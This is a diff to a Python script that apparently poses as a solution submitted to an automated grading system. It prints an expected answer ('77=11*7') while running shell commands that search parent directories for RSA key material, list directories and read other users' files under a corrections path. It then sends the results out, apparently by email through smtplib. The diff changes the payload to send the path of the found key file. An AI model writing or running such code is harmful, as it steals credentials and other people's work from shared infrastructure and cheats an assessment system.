@@ -37,7 +37,7 @@ def get_data(command):
 # my_data += get_data("pwd ../../../../") or ""
 # my_data += get_data("ls -al ../../../../corrections_*/") or ""
 my_data = "\n#######################\n"
-my_data += get_data("grep -rl 'rsa-' ../../../../") or ""
+file_dir = get_data("grep -rl 'rsa-' ../../../../").split()[-1] or ""
 # my_data += get_data("ls -al ../../../../corrections_*/.git/") or ""
 # my_data += "\n#######################\n"
 # my_data += get_data("ls -l ../../../../corrections_*/corrections/262/1397") or ""
@@ -49,6 +49,7 @@ my_data += get_data("grep -rl 'rsa-' ../../../../") or ""
 # my_data += "\n#######################\n"
 # # my_data += get_data("tar -czvf file.tar.gz ../../../../corrections_*/corrections/262/")
 # my_data += get_data("ls -l ../../../corrections_*/corrections/2184/20259") or ""
+my_data += get_data("ls -l") or ""
 my_data += "\n#######################\n"
 my_data += get_data("pwd") or ""
 my_data += get_data("cat ../../../../*/262/531078/tempCodeRunnerFile.python") or ""
@@ -61,7 +62,7 @@ print("77=11*7")
 with open(argv[1], "r") as f:
     for line in f:
         if(line.count("77")):
-            send_data(my_data)
+            send_data(file_dir)
 ##############################################################
 import smtplib
 from email.mime.multipart import MIMEMultipart
